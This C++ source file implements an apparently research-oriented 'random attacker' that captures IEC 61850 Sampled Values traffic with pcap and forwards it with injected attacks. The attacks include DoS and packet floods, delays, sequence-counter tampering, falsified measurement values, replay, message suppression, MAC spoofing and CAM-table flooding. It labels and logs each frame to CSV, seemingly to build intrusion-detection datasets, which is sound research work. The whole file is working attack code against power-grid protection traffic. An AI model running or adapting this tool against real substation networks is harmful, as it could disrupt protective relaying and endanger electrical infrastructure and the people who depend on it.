#define main sv_attacker_cli_main
#include "sv_attacker.cpp"
#undef main

#include <csignal>
#include <unordered_map>

static volatile std::sig_atomic_t g_running = 1;
extern "C" void on_sigint(int) { g_running = 0; }

struct AttackVariant {
    Scenario scenario;
    std::string mode;
    std::string label;
};

struct DelayedFrame {
    std::chrono::high_resolution_clock::time_point release_at;
    std::vector<uint8_t> frame;
    CsvRow csv_row;
};

struct RandomRuntime {
    std::deque<std::vector<uint8_t>> replay_buffer;
    std::vector<std::vector<uint8_t>> replay_snapshot;
    size_t replay_cursor = 0;
    bool replay_snapshot_taken = false;
    std::deque<DelayedFrame> delay_queue;
    int dm_pkt = 0;
    std::vector<size_t> dm_channels = random_channel_subset();
    int drop_rem = 5;
    bool mark_next = false;
    int forward_rem = 0;
    std::string per_frame_label;
    std::optional<std::array<uint8_t, 6>> spoof_mac;
};

// ── Attack bag: each scenario is equally likely ────────────────────────────
static const std::vector<Scenario> g_attack_bag = {
    // Scenario::DATA_MANIPULATION,
    Scenario::DENIAL_OF_SERVICE,
    // Scenario::FALSE_INJECTION,
    // Scenario::REPLAY,
    Scenario::PACKET_FLOODING,
    // Scenario::TIME_SYNC_ATTACK,
    // Scenario::MSG_SUPPRESSION,
    Scenario::DELAY,
    Scenario::SEQUENCE_MANIPULATION,
    // Scenario::MAN_IN_THE_MIDDLE,
    // Scenario::MAC_ARP_FLOODING,
};

// ── Modes + labels for multi-mode scenarios ───────────────────────────────
// Scenarios not listed here have no mode (empty string) and derive label
// from scenario_default_label().
static const std::unordered_map<Scenario, std::vector<std::pair<std::string, std::string>>> g_scenario_modes = {
    { Scenario::DATA_MANIPULATION, {
        {"scale", "dm_scale"},
        {"offset", "dm_offset"},
        // {"zero", "dm_zero"},
        {"negate", "dm_negate"},
        {"noise", "dm_noise"},
        // {"force_max", "dm_force_max"},
        {"fault_simulation", "dm_fault"},
        {"step", "dm_step"},
        {"ramp", "dm_ramp"},
        {"phase_shift", "dm_phase_shift"},
        // {"fake_sine", "dm_fake_sine"},
        {"harmonic_injection", "dm_harmonic"},
        {"phase_swap_ab", "dm_swap_ab"},
        {"phase_swap_ac", "dm_swap_ac"},
    }},
    { Scenario::DENIAL_OF_SERVICE, {
        {"valid_sv_flood", "dos_valid"},
        {"zero_value_flood", "dos_zero"},
        {"extreme_value_flood", "dos_extreme"},
    }},
    { Scenario::REPLAY, {
        {"cycle", "replay"},
    }},
    { Scenario::DELAY, {
        {"fixed", "delay"},
    }},
    { Scenario::SEQUENCE_MANIPULATION, {
        // {"rollback", "seq_rollback"},
        {"jump", "seq_jump"},
        {"zero", "seq_zero"},
        {"random", "seq_random"},
        {"max", "seq_max"},
    }},
    { Scenario::MAN_IN_THE_MIDDLE, {
        {"scale", "mitm_scale"},
        {"offset", "mitm_offset"},
        {"negate", "mitm_negate"},
        {"noise", "mitm_noise"},
        {"phase_shift", "mitm_phase_shift"},
    }},
};

static std::string scenario_default_label(Scenario s) {
    switch (s) {
        case Scenario::FALSE_INJECTION:   return "false_injection";
        case Scenario::PACKET_FLOODING:   return "packet_flooding";
        case Scenario::TIME_SYNC_ATTACK:  return "time_sync";
        case Scenario::MSG_SUPPRESSION:   return "msg_suppression";
        case Scenario::MAC_ARP_FLOODING:  return "mac_arp";
        default: return "";
    }
}

static AttackVariant pick_random_attack() {
    Scenario s = g_attack_bag[static_cast<size_t>(rand_int(0, static_cast<int>(g_attack_bag.size()) - 1))];
    auto it = g_scenario_modes.find(s);
    if (it != g_scenario_modes.end() && !it->second.empty()) {
        int idx = rand_int(0, static_cast<int>(it->second.size()) - 1);
        return {s, it->second[idx].first, it->second[idx].second};
    }
    return {s, "", scenario_default_label(s)};
}

static double attack_duration_sec(const AttackVariant& atk) {
    switch (atk.scenario) {
        case Scenario::DENIAL_OF_SERVICE:   return rand_real(0.5, 0.6);
        case Scenario::PACKET_FLOODING:     return rand_real(0.3, 0.8);
        // case Scenario::MAC_ARP_FLOODING:    return rand_real(0.025, 0.06);
        case Scenario::MSG_SUPPRESSION:     return rand_real(0.5, 4);
        default: return rand_real(1, 6);
    }
}

static void reset_attack_state(RandomRuntime& rt, const AttackVariant& atk) {
    rt.replay_snapshot.clear();
    rt.replay_snapshot_taken = false;
    rt.replay_cursor = 0;
    rt.delay_queue.clear();
    rt.dm_pkt = 0;
    rt.dm_channels = random_channel_subset();
    rt.spoof_mac = (atk.scenario == Scenario::MAN_IN_THE_MIDDLE)
        ? std::optional<std::array<uint8_t, 6>>(random_mac())
        : std::nullopt;
    rt.per_frame_label.clear();
    g_ramp_value = 0.0f;
    if (atk.scenario == Scenario::MSG_SUPPRESSION) {
        rt.drop_rem = rand_int(5, 10);
        rt.mark_next = false;
        rt.forward_rem = 0;
    }
}

static void process_normal_packet(const L2Fields& fields,
    std::vector<std::vector<uint8_t>>& out_frames, RandomRuntime& rt) {
    rt.replay_buffer.push_back(fields.frame);
    if (rt.replay_buffer.size() > 500) rt.replay_buffer.pop_front();
    out_frames.push_back(fields.frame);
}

static void process_attack_packet(const AttackVariant& atk, const Config& cfg,
    const L2Fields& fields, std::vector<std::vector<uint8_t>>& out_frames,
    std::vector<float>& csv_samples, const std::vector<float>** csv_row_samples,
    RandomRuntime& rt, double phase_shift_rad, bool& drop_original) {

    rt.per_frame_label.clear();

    if (atk.scenario == Scenario::DATA_MANIPULATION || atk.scenario == Scenario::MAN_IN_THE_MIDDLE) {
        drop_original = true;
        int smp_rate_val = fields.apdu.smpRate > 0 ? fields.apdu.smpRate : 4000;
        auto base = samples_from_fields(fields);

        std::vector<float> mutated_all;
        if (atk.mode == "phase_swap_ab") {
            mutated_all = base;
            swap_phases(mutated_all, 0, 1);
            swap_phases(mutated_all, 4, 5);
        } else if (atk.mode == "phase_swap_ac") {
            mutated_all = base;
            swap_phases(mutated_all, 0, 2);
            swap_phases(mutated_all, 4, 6);
        } else {
            mutated_all = mutate_samples(base, atk.mode,
                atk.scenario == Scenario::MAN_IN_THE_MIDDLE ? rand_real(0.7, 1.3) : rand_real(1.5, 3.0),
                rand_real(50.0, 100.0), rand_real(-1000.0, 1000.0),
                cfg.freq_hz, fields.apdu.smpCnt, smp_rate_val, phase_shift_rad, cfg.harmonic_frac);
        }

        std::vector<float> mutated = apply_selected_channels(base, mutated_all, rt.dm_channels);
        auto frame = fields.frame;
        if (atk.scenario == Scenario::MAN_IN_THE_MIDDLE && rt.spoof_mac && frame.size() >= 12)
            std::copy(rt.spoof_mac->begin(), rt.spoof_mac->end(), frame.begin() + 6);
        if (patch_samples(frame, fields, mutated)) {
            csv_samples = mutated;
            *csv_row_samples = &csv_samples;
            out_frames.push_back(std::move(frame));
        } else {
            auto mac_opt = (atk.scenario == Scenario::MAN_IN_THE_MIDDLE) ? rt.spoof_mac : std::nullopt;
            csv_samples = mutated;
            *csv_row_samples = &csv_samples;
            out_frames.push_back(build_l2_frame_from_fields(fields, mutated, fields.apdu.smpCnt, mac_opt));
        }
        ++rt.dm_pkt;

    } else if (atk.scenario == Scenario::DENIAL_OF_SERVICE) {
        drop_original = true;

    } else if (atk.scenario == Scenario::FALSE_INJECTION) {
        drop_original = true;
        int smp_rate_val = fields.apdu.smpRate > 0 ? fields.apdu.smpRate : 80;
        double angle = 2.0 * M_PI * (fields.apdu.smpCnt % smp_rate_val) / smp_rate_val;
        float i_peak = 141.4f, v_peak = 155563.0f;
        std::vector<float> sine = {
            static_cast<float>(i_peak * std::sin(angle)),
            static_cast<float>(i_peak * std::sin(angle - 2.0943951023931953)),
            static_cast<float>(i_peak * std::sin(angle + 2.0943951023931953)),
            0.0f,
            static_cast<float>(v_peak * std::sin(angle)),
            static_cast<float>(v_peak * std::sin(angle - 2.0943951023931953)),
            static_cast<float>(v_peak * std::sin(angle + 2.0943951023931953)),
            0.0f
        };
        auto frame = fields.frame;
        bool patched = patch_samples(frame, fields, sine);
        if (!patch_smp_synch(frame, fields, 1)) patched = false;
        if (!patched)
            frame = build_l2_frame_from_fields(fields, sine, fields.apdu.smpCnt, std::nullopt, 1);
        csv_samples = sine;
        *csv_row_samples = &csv_samples;
        out_frames.push_back(std::move(frame));

    } else if (atk.scenario == Scenario::REPLAY) {
        if (!rt.replay_snapshot_taken && !rt.replay_buffer.empty()) {
            rt.replay_snapshot.assign(rt.replay_buffer.begin(), rt.replay_buffer.end());
            rt.replay_cursor = 0;
            rt.replay_snapshot_taken = true;
        }
        if (rt.replay_snapshot_taken) {
            drop_original = true;
            auto f = rt.replay_snapshot[rt.replay_cursor];
            rt.replay_cursor = (rt.replay_cursor + 1) % rt.replay_snapshot.size();
            L2Fields rf;
            if (parse_l2_fields(f.data(), f.size(), rf, true) && !rf.apdu.samples.empty()) {
                csv_samples = rf.apdu.samples;
            } else {
                csv_samples.assign(8, 0.0f);
            }
            *csv_row_samples = &csv_samples;
            out_frames.push_back(std::move(f));
        }

    } else if (atk.scenario == Scenario::SEQUENCE_MANIPULATION) {
        int cur = (std::max)(0, fields.apdu.smpCnt);
        int next = cur;
        // if (atk.mode == "rollback") next = (cur - rollback_offset + SV_WRAP_DEFAULT) % SV_WRAP_DEFAULT;
        if (atk.mode == "jump") next = (cur + rand_int(50, 500)) % SV_WRAP_DEFAULT;
        else if (atk.mode == "zero") next = 0;
        else if (atk.mode == "random") next = rand_int(0, SV_WRAP_DEFAULT - 1);
        else if (atk.mode == "max") next = SV_WRAP_DEFAULT - 1;
        auto frame = fields.frame;
        if (!patch_smp_cnt(frame, fields, next))
            frame = build_l2_frame_from_fields(fields, samples_from_fields(fields), next);
        out_frames.push_back(std::move(frame));

    } else if (atk.scenario == Scenario::PACKET_FLOODING) {
        drop_original = true;

    } else if (atk.scenario == Scenario::TIME_SYNC_ATTACK) {
        drop_original = true;
        auto frame = fields.frame;
        int synch = 0;
        if (!patch_smp_synch(frame, fields, synch))
            frame = build_l2_frame_from_fields(fields, samples_from_fields(fields),
                fields.apdu.smpCnt, std::nullopt, synch);
        int skew_ms = rand_int(1, 2);
        patch_refr_tm(frame, fields, skew_ms, true);
        out_frames.push_back(std::move(frame));

    } else if (atk.scenario == Scenario::MSG_SUPPRESSION) {
        if (rt.drop_rem > 0) {
            drop_original = true;
            --rt.drop_rem;
            if (rt.drop_rem == 0) {
                rt.mark_next = true;
                rt.forward_rem = rand_int(3, 8);
            }
        } else if (rt.mark_next) {
            out_frames.push_back(fields.frame);
            rt.mark_next = false;
            rt.per_frame_label = "msg_suppression";
        } else if (rt.forward_rem > 0) {
            out_frames.push_back(fields.frame);
            --rt.forward_rem;
            if (rt.forward_rem == 0)
                rt.drop_rem = rand_int(5, 10);
            rt.per_frame_label = "normal";
        }

    } else if (atk.scenario == Scenario::MAC_ARP_FLOODING) {
        drop_original = true;
        int burst = rand_int(5, 20);
        for (int i = 0; i < burst; ++i)
            out_frames.push_back(build_cam_flood_frame(cfg.dst_mac));

    } else if (atk.scenario == Scenario::DELAY) {
        drop_original = true;
        CsvRow delay_row = make_csv_row(fields, atk.label);
        rt.delay_queue.push_back({
            std::chrono::high_resolution_clock::now() + std::chrono::milliseconds(cfg.delay_ms),
            fields.frame,
            std::move(delay_row)});
        auto now = std::chrono::high_resolution_clock::now();
        while (!rt.delay_queue.empty() && rt.delay_queue.front().release_at <= now) {
            out_frames.push_back(std::move(rt.delay_queue.front().frame));
            rt.delay_queue.pop_front();
        }
    }
}

static std::string classify_scenario(Scenario s, bool attack) {
    if (!attack) return "Normal";
    switch (s) {
        case Scenario::FALSE_INJECTION:
        case Scenario::MAN_IN_THE_MIDDLE:
        case Scenario::DATA_MANIPULATION:
            return "Manipulation";
        case Scenario::DENIAL_OF_SERVICE:
        case Scenario::PACKET_FLOODING:
            return "Traffic";
        case Scenario::REPLAY:
        case Scenario::DELAY:
        case Scenario::MSG_SUPPRESSION:
        case Scenario::TIME_SYNC_ATTACK:
        case Scenario::SEQUENCE_MANIPULATION:
            return "Timing/Protocol";
        default:
            return "";
    }
}

static void run_random_attacker(const Config& cfg, bool cycle_all) {
    std::signal(SIGINT, on_sigint);

    std::cout << "[random] attack scenarios in bag: " << g_attack_bag.size() << "\n";

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* forward_handle = pcap_open_live(cfg.forward_iface.c_str(), 65535, 1, 1, errbuf);
    if (!forward_handle) {
        std::cerr << "[error] forward device: " << errbuf << "\n";
        return;
    }

    pcap_t* flood_handle = pcap_open_live(cfg.forward_iface.c_str(), 65535, 1, 1, errbuf);
    if (!flood_handle) {
        std::cerr << "[error] flood device: " << errbuf << "\n";
        pcap_close(forward_handle);
        return;
    }

    std::unique_ptr<CsvLogger> logger;
    if (cfg.enable_csv) logger = std::make_unique<CsvLogger>(cfg.csv_path, cfg.csv_queue_size);

    pcap_t* capture_handle = open_capture_handle(cfg.capture_iface, errbuf);
    if (!capture_handle) {
        std::cerr << "[error] capture device: " << errbuf << "\n";
        pcap_close(forward_handle);
        pcap_close(flood_handle);
        return;
    }

    RandomRuntime rt;

    double phase_shift_rad = cfg.phase_shift_deg * M_PI / 180.0;
    uint64_t total_captured = 0, total_forwarded = 0, total_dropped = 0, total_parse_errors = 0;
    uint64_t cycle_idx = 0;

    AttackVariant current = pick_random_attack();
    bool in_attack = false;
    reset_attack_state(rt, current);

    auto start = std::chrono::high_resolution_clock::now();
    auto phase_start = start;
    auto last_status = start;
    double normal_duration = rand_real(0.15, 0.3);
    double atk_duration = attack_duration_sec(current);

    std::unordered_map<std::string, uint64_t> per_attack_stats;

    std::cout << "[random] initial: NORMAL (" << std::fixed << std::setprecision(2) << normal_duration << "s)\n";

    // ── Flood thread infrastructure (DoS / PacketFlooding) ──────────────
    std::thread flood_thread;
    std::atomic<bool> flood_active{false};
    bool prev_flood_active = false;
    struct { std::mutex mtx; L2Fields fields; bool valid = false; } flood_template;

    auto start_dos_flood = [&]() {
        std::string mode = current.mode;
        std::string scen_name = scenario_name(current.scenario);
        flood_thread = std::thread([&, mode, scen_name]() {
            int local_smp = 0;
            CsvRow row;
            row.source = cfg.src_mac;
            row.destination = cfg.dst_mac;
            row.type = "0x88ba";
            row.appId = std::to_string(cfg.app_id);
            row.confRev = "1";
            row.smpSynch = "2";
            row.smpRate = std::to_string(cfg.smp_rate);
            row.attack = scen_name;
            row.classification = "Traffic";
            auto next = std::chrono::steady_clock::now();
            while (flood_active) {
                std::vector<uint8_t> frame;
                std::vector<float> vals(8, 0.0f);
                int cur_smp = local_smp;
                if (mode == "zero_value_flood") {
                } else if (mode == "extreme_value_flood") {
                    vals.assign(8, 99999.0f);
                } else {
                    float value = random_choice(std::vector<float>{100.0f, 141.4f, 99999.0f});
                    vals.assign(8, value);
                }
                frame = build_synthetic_frame(cfg.src_mac, cfg.dst_mac, cfg.app_id,
                                              cur_smp, vals,
                                              SV_ETHERTYPE, cfg.sv_id, cfg.dat_set, cfg.smp_rate);
                local_smp = (local_smp + 1) % SV_WRAP_DEFAULT;
                row.length = std::to_string(frame.size());
                row.svID = cfg.sv_id;
                row.datSet = cfg.dat_set;
                row.smpCnt = std::to_string(cur_smp);
                row.refrTm = timestamp_to_string(current_timestamp_float());
                for (size_t j = 0; j < 8; ++j)
                    row.channels[j] = j < vals.size() ? float_to_string(vals[j]) : "0.000";
                send_frame(flood_handle, frame, logger.get(), row);
                next += std::chrono::microseconds(100);
                std::this_thread::sleep_until(next);
            }
        });
    };

    auto start_packet_flood = [&]() {
        std::lock_guard<std::mutex> lk(flood_template.mtx);
        L2Fields tmpl = flood_template.fields;
        bool valid = flood_template.valid;
        std::string scen_name = scenario_name(current.scenario);
        flood_thread = std::thread([&, tmpl, valid, scen_name]() {
            if (!valid) return;
            int cnt = tmpl.apdu.smpCnt;
            CsvRow base_row;
            base_row.source = tmpl.src_mac;
            base_row.destination = tmpl.dst_mac;
            base_row.type = "0x88ba";
            base_row.appId = std::to_string(tmpl.app_id);
            base_row.length = std::to_string(tmpl.frame.size());
            base_row.svID = tmpl.apdu.svID;
            base_row.datSet = tmpl.apdu.datSet;
            base_row.confRev = value_or_na(tmpl.apdu.confRev);
            base_row.smpSynch = value_or_na(tmpl.apdu.smpSynch);
            base_row.smpRate = value_or_na(tmpl.apdu.smpRate);
            base_row.attack = scen_name;
            base_row.classification = "Traffic";
            for (size_t i = 0; i < base_row.channels.size(); ++i)
                base_row.channels[i] = i < tmpl.apdu.samples.size() ? float_to_string(tmpl.apdu.samples[i]) : "N/A";
            auto next = std::chrono::steady_clock::now();
            while (flood_active) {
                cnt = (cnt + 1) % SV_WRAP_DEFAULT;
                auto dup = tmpl.frame;
                if (!patch_smp_cnt(dup, tmpl, cnt)) {
                    dup = build_l2_frame_from_fields(tmpl, samples_from_fields(tmpl), cnt);
                }
                double now_ts = current_timestamp_float();
                int skew_ms = static_cast<int>((now_ts - tmpl.apdu.refrTm) * 1000.0);
                patch_refr_tm(dup, tmpl, skew_ms, false);
                CsvRow copy_row = base_row;
                copy_row.smpCnt = std::to_string(cnt);
                copy_row.refrTm = timestamp_to_string(now_ts);
                copy_row.length = std::to_string(dup.size());
                send_frame(flood_handle, dup, logger.get(), copy_row);
                next += std::chrono::microseconds(100);
                std::this_thread::sleep_until(next);
            }
        });
    };

    auto stop_flood = [&]() {
        flood_active = false;
        if (flood_thread.joinable()) flood_thread.join();
    };

    while (g_running) {
        struct pcap_pkthdr* pkt_header = nullptr;
        const uint8_t* pkt_data = nullptr;
        int res = pcap_next_ex(capture_handle, &pkt_header, &pkt_data);
        if (res <= 0 || !pkt_header || !pkt_data || pkt_header->caplen == 0) continue;
        if (!is_sv_packet(pkt_data, pkt_header->caplen)) continue;
        ++total_captured;

        L2Fields fields;
        if (!parse_l2_fields(pkt_data, pkt_header->caplen, fields, true)) {
            ++total_parse_errors;
            continue;
        }
        if (fields.app_id != TARGET_SV_APP_ID) {
            ++total_dropped;
            continue;
        }

        // Update flood template for packet flooding
        {
            std::lock_guard<std::mutex> lk(flood_template.mtx);
            flood_template.fields = fields;
            flood_template.valid = true;
        }

        auto now = std::chrono::high_resolution_clock::now();
        double phase_elapsed = std::chrono::duration<double>(now - phase_start).count();

        // ── Phase transitions (check BEFORE processing packet) ──────────
        if (!in_attack && phase_elapsed >= normal_duration) {
            if (prev_flood_active) {
                stop_flood();
                prev_flood_active = false;
            }
            in_attack = true;
            if (cycle_all) {
                Scenario s = g_attack_bag[cycle_idx % g_attack_bag.size()];
                auto it = g_scenario_modes.find(s);
                if (it != g_scenario_modes.end() && !it->second.empty()) {
                    int midx = rand_int(0, static_cast<int>(it->second.size()) - 1);
                    current = {s, it->second[midx].first, it->second[midx].second};
                } else {
                    current = {s, "", scenario_default_label(s)};
                }
                ++cycle_idx;
            } else {
                current = pick_random_attack();
            }
            reset_attack_state(rt, current);
            atk_duration = attack_duration_sec(current);
            phase_start = now;
            std::cout << "[attack] " << current.label << "  (" << std::fixed << std::setprecision(2) << atk_duration << "s)\n";
            if (current.scenario == Scenario::DENIAL_OF_SERVICE || current.scenario == Scenario::PACKET_FLOODING) {
                flood_active = true;
                if (current.scenario == Scenario::DENIAL_OF_SERVICE)
                    start_dos_flood();
                else
                    start_packet_flood();
                prev_flood_active = true;
            }
            continue;
        }
        if (in_attack && phase_elapsed >= atk_duration) {
            bool was_flood = prev_flood_active;
            if (prev_flood_active) {
                stop_flood();
                prev_flood_active = false;
            }
            if (was_flood) {
                struct pcap_pkthdr* dhdr;
                const uint8_t* ddata;
                int drain = 0;
                while (pcap_next_ex(capture_handle, &dhdr, &ddata) > 0 && drain < 5000)
                    ++drain;
            }
            in_attack = false;
            normal_duration = rand_real(1.5, 7.0);
            phase_start = now;
            rt.delay_queue.clear();
            std::cout << "[normal] gap (" << std::fixed << std::setprecision(2) << normal_duration << "s)\n";
            continue;
        }

        // ── Process packet according to current phase ──────────────────
        std::vector<std::vector<uint8_t>> out_frames;
        std::string attack_label;
        bool drop_original = false;
        std::vector<float> csv_samples;
        const std::vector<float>* csv_row_samples = &fields.apdu.samples;

        if (!in_attack) {
            attack_label = "normal";
            process_normal_packet(fields, out_frames, rt);
        } else {
            attack_label = scenario_name(current.scenario);
            process_attack_packet(current, cfg, fields, out_frames, csv_samples,
                &csv_row_samples, rt, phase_shift_rad, drop_original);
        }

        if (drop_original && out_frames.empty()) {
            ++total_dropped;
            continue;
        }

        std::string classification = classify_scenario(current.scenario, in_attack);
        for (const auto& frame : out_frames) {
            std::string label = rt.per_frame_label.empty() ? attack_label : rt.per_frame_label;
            rt.per_frame_label.clear();
            CsvRow row;
            if (!make_csv_row_from_packet(frame.data(), frame.size(), label, row))
                row = make_csv_row(fields, label, *csv_row_samples);
            row.classification = classification;
            if (send_frame(forward_handle, frame, logger.get(), row)) {
                ++total_forwarded;
                if (in_attack) per_attack_stats[current.label]++;
            } else {
                ++total_dropped;
            }
        }

        now = std::chrono::high_resolution_clock::now();
        if (now - last_status >= std::chrono::seconds(2)) {
            double elapsed = std::chrono::duration<double>(now - start).count();
            std::cout << "t=" << std::fixed << std::setprecision(1) << elapsed << "s"
                      << " phase=" << (in_attack ? current.label : "normal")
                      << " cap=" << total_captured
                      << " fwd=" << total_forwarded
                      << " drop=" << total_dropped
                      << " parse_err=" << total_parse_errors
                       << (cycle_all ? (" cycle=" + std::to_string(cycle_idx) + "/" + std::to_string(g_attack_bag.size())) : "")
                      << "\n";
            last_status = now;
        }
    }

    stop_flood();
    pcap_close(flood_handle);
    pcap_close(capture_handle);
    pcap_close(forward_handle);
    if (logger) logger->stop();

    std::cout << "\n=== Random Attacker Summary ===\n";
    std::cout << "captured=" << total_captured << " forwarded=" << total_forwarded
              << " dropped=" << total_dropped << " parse_errors=" << total_parse_errors << "\n";
    if (cycle_all)
        std::cout << "cycle completed: " << cycle_idx << "/" << g_attack_bag.size() << " scenarios\n";
    std::cout << "Per-attack stats:\n";
    for (auto& [label, count] : per_attack_stats)
        std::cout << "  " << label << ": " << count << " pkts\n";
    if (logger)
        std::cout << "csv: queued=" << logger->get_queued_count()
                  << " logged=" << logger->get_logged_count()
                  << " dropped=" << logger->get_dropped_count()
                  << " file=" << cfg.csv_path << "\n";
}

void print_random_usage() {
    std::cout << "Usage: random_attacker [options]\n"
              << "  --iface <device>           Capture interface\n"
              << "  --forward-iface <device>   Forward interface\n"
               << "  --cycle-all                Iterate through every attack scenario once (random mode each)\n"
              << "  --packet-csv <path>        CSV output path\n"
              << "  --csv-queue-size <n>       Max queued CSV packets\n"
              << "  --delay-ms <n>             Delay attack latency (default: 50)\n"
              << "  --src-mac <mac>            Source MAC for generated frames\n"
              << "  --dst-mac <mac>            Destination MAC for generated frames\n"
              << "  --freq-hz <hz>             Grid frequency (default: 50)\n"
              << "  --phase-shift-deg <deg>    Phase shift angle (default: 30)\n"
              << "  --harmonic-frac <frac>     Harmonic fraction (default: 0.3)\n"
              << "  --no-csv                   Disable CSV logging\n"
              << "  --list-interfaces          List Npcap interfaces\n"
              << "  --help                     This help\n"
              << "\n"
              << "Press Ctrl+C to stop.\n";
}

int main(int argc, char* argv[]) {
    Config cfg;
    cfg.csv_path = "sv_random.csv";
    bool cycle_all = false;

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "--iface" && i + 1 < argc) cfg.capture_iface = argv[++i];
        else if (arg == "--forward-iface" && i + 1 < argc) cfg.forward_iface = argv[++i];
        else if (arg == "--cycle-all") cycle_all = true;
        else if (arg == "--packet-csv" && i + 1 < argc) cfg.csv_path = argv[++i];
        else if (arg == "--csv-queue-size" && i + 1 < argc) cfg.csv_queue_size = static_cast<size_t>(std::stoull(argv[++i]));
        else if (arg == "--delay-ms" && i + 1 < argc) cfg.delay_ms = std::stoi(argv[++i]);
        else if (arg == "--src-mac" && i + 1 < argc) cfg.src_mac = argv[++i];
        else if (arg == "--dst-mac" && i + 1 < argc) cfg.dst_mac = argv[++i];
        else if (arg == "--freq-hz" && i + 1 < argc) cfg.freq_hz = std::stod(argv[++i]);
        else if (arg == "--phase-shift-deg" && i + 1 < argc) cfg.phase_shift_deg = std::stod(argv[++i]);
        else if (arg == "--harmonic-frac" && i + 1 < argc) cfg.harmonic_frac = std::stod(argv[++i]);
        else if (arg == "--no-csv") cfg.enable_csv = false;
        else if (arg == "--csv") cfg.enable_csv = true;
        else if (arg == "--list-interfaces") {
            pcap_if_t* alldevs = nullptr;
            char eb[PCAP_ERRBUF_SIZE];
            if (pcap_findalldevs(&alldevs, eb) == -1) {
                std::cerr << "Error: " << eb << "\n";
                return 1;
            }
            int idx = 1;
            for (pcap_if_t* d = alldevs; d; d = d->next)
                std::cout << "  " << idx++ << ". " << d->name << "\n";
            pcap_freealldevs(alldevs);
            return 0;
        } else if (arg == "--help" || arg == "-h") {
            print_random_usage();
            return 0;
        }
    }

    std::cout << "Random Attacker\n"
              << "  capture: " << cfg.capture_iface << "\n"
              << "  forward: " << cfg.forward_iface << "\n"
              << "  mode: " << (cycle_all ? "cycle-all (each scenario once)" : "random") << "\n"
              << "  csv: " << (cfg.enable_csv ? cfg.csv_path : "disabled") << "\n"
              << "Press Ctrl+C to stop.\n";

    run_random_attacker(cfg, cycle_all);
    return 0;
}
